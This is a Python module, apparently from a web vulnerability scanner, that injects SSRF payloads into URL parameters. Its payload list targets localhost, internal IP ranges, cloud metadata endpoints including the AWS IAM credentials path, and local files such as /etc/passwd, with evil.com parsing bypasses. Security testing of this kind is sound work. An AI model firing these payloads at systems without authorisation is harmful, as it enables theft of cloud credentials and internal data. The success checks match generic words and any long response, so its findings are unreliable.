# ===========================================================
# FILE: app/modules/scanner/modules/ssrf_scanner.py
# ===========================================================

"""
SSRF Scanner - Server-Side Request Forgery detection.

Detects SSRF vulnerabilities by testing:
- Internal IP addresses (127.0.0.1, localhost)
- Cloud metadata endpoints (AWS, GCP, Azure)
- Internal services
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests


class SSRFScanner:
    """
    Server-Side Request Forgery Scanner.

    Detects SSRF vulnerabilities by testing internal endpoints
    and cloud metadata services.
    """

    # SSRF test payloads
    SSRF_PAYLOADS = [
        # Localhost variants
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://localhost",
        "http://localhost:80",
        "http://0.0.0.0",
        # AWS Metadata
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        # Internal IP ranges
        "http://10.0.0.1",
        "http://10.0.0.2",
        "http://172.16.0.1",
        "http://172.31.0.1",
        "http://192.168.0.1",
        "http://192.168.1.1",
        # GCP Metadata
        "http://metadata.google.internal",
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure Metadata
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
        # File protocols
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # URL encoded bypasses
        "http://127.0.0.1%23@evil.com/",
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1%00@evil.com/",
        "http://[::1]",
        "http://[::1]:80",
    ]

    # Indicators of SSRF success
    SUCCESS_INDICATORS = [
        r"root:.*:0:0:",
        r"uid=",
        r"\[fonts\]",
        r"\[extensions\]",
        r"Windows Registry",
        r"instance-id",
        r"local-ipv4",
        r"public-keys",
        r"security-credentials",
        r"ami-id",
        r"hostname",
        r"metadata",
        r"computeMetadata",
        r"200 OK",
        r"connection refused",
        r"Failed to connect",
        r"Connection refused",
    ]

    def __init__(
        self,
        timeout: int = 10,
        max_redirects: int = 3,
        logger: logging.Logger | None = None,
    ) -> None:
        """
        Initialize SSRF Scanner.

        Args:
            timeout: Request timeout in seconds
            max_redirects: Maximum redirects to follow
            logger: Optional logger instance
        """
        self.timeout = timeout
        self.max_redirects = max_redirects
        self._session = requests.Session()
        self._session.max_redirects = max_redirects
        self._logger = logger or logging.getLogger(__name__)

    def scan(
        self,
        url: str,
        params: dict[str, Any] | None = None,
        session: requests.Session | None = None,
    ) -> list[dict[str, Any]]:
        """
        Scan for SSRF vulnerabilities.

        Args:
            url: Target URL
            params: URL parameters (if None, auto-detect)
            session: Optional session (creates new if None)

        Returns:
            List of findings (never None)
        """
        self._logger.info(f"SSRF scanning: {url}")

        if session:
            self._session = session

        findings: list[dict[str, Any]] = []

        # Extract parameters if not provided
        if params is None:
            params = self._extract_params(url)

        if not params:
            self._logger.debug("No parameters found, testing URL directly")
            finding = self._test_payload(url, "")
            if finding:
                findings.append(finding)
            return findings

        # Test each parameter with each payload
        for param_name in params:
            for payload in self.SSRF_PAYLOADS:
                try:
                    result = self._test_parameter(url, param_name, payload)
                    if result:
                        findings.append(result)
                except (requests.RequestException, ValueError, TypeError) as e:
                    self._logger.debug(f"Error testing {param_name}: {e}")
                    continue

        self._logger.info(f"SSRF scan complete: {len(findings)} findings")
        return findings

    def _test_parameter(
        self,
        url: str,
        param: str,
        payload: str,
    ) -> dict[str, Any] | None:
        """Test a single parameter with a payload."""
        try:
            test_url = self._inject_payload(url, param, payload)

            response = self._session.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=True,
            )

            # Check for SSRF indicators
            if self._is_ssrf_response(response):
                return {
                    "type": "SSRF",
                    "severity": "critical",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": response.text[:500] if response.text else "",
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                }

            # Check for status code changes
            if response.status_code in (200, 201, 202, 204, 301, 302, 307, 308):
                if len(response.text) > 100:
                    return {
                        "type": "SSRF",
                        "severity": "high",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Status: {response.status_code}, Length: {len(response.text)}",
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                    }

        except requests.exceptions.Timeout:
            self._logger.debug(f"SSRF timeout: {payload}")
            return None
        except requests.exceptions.ConnectionError:
            self._logger.debug(f"SSRF connection error: {payload}")
            return None
        except (requests.RequestException, ValueError, TypeError) as e:
            self._logger.debug(f"SSRF error: {e}")
            return None

        return None

    def _test_payload(self, url: str, payload: str) -> dict[str, Any] | None:
        """Test payload directly on URL."""
        try:
            response = self._session.get(
                url + payload,
                timeout=self.timeout,
                allow_redirects=True,
            )

            if self._is_ssrf_response(response):
                return {
                    "type": "SSRF",
                    "severity": "critical",
                    "url": url,
                    "parameter": "url",
                    "payload": payload,
                    "evidence": response.text[:500],
                    "status_code": response.status_code,
                }
        except (requests.RequestException, ValueError, TypeError):
            pass
        return None

    def _is_ssrf_response(self, response: requests.Response) -> bool:
        """Check if response indicates SSRF."""
        if not response or not response.text:
            return False

        text = response.text.lower()

        for indicator in self.SUCCESS_INDICATORS:
            if re.search(indicator, text, re.IGNORECASE):
                return True

        # Check for metadata keywords
        metadata_keywords = [
            "aws",
            "ec2",
            "instance",
            "meta-data",
            "user-data",
            "iam",
            "security-credentials",
            "role",
            "profile",
            "computeMetadata",
            "google",
            "azure",
            "localhost",
            "127.0.0.1",
            "internal",
        ]

        for keyword in metadata_keywords:
            if keyword in text:
                return True

        # Check for file content
        if "root:x:" in text or "win.ini" in text:
            return True

        return False

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        query[param] = [payload]
        new_query = urlencode(query, doseq=True)

        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _extract_params(self, url: str) -> list[str]:
        """Extract parameters from URL."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        return list(query.keys())
